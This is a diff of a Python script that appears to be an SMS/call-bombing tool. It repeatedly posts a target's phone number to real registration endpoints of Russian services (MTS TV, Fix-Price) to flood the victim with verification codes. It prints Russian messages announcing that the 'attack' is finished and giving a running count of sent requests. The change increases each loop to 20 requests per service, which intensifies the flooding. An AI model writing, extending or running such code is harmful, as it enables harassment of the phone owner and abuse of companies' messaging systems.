@@ -4243,9 +4243,10 @@ if call == str(2):
             break
         try:
             i = 0
-            while i < 9:
+            while i < 20:
                 
                 requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
+                i = i + 1
                 R = R + 1
                 print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
@@ -9875,11 +9876,14 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
+            i = 0
+            while i < 20:
+                requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
+                i = i + 1
+                R = R + 1
+                print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
+                time.sleep(0.1)
         except:
             print('[-] не отправлено!')
         if time.time() > start_time + float(CLOSE_AFTER):
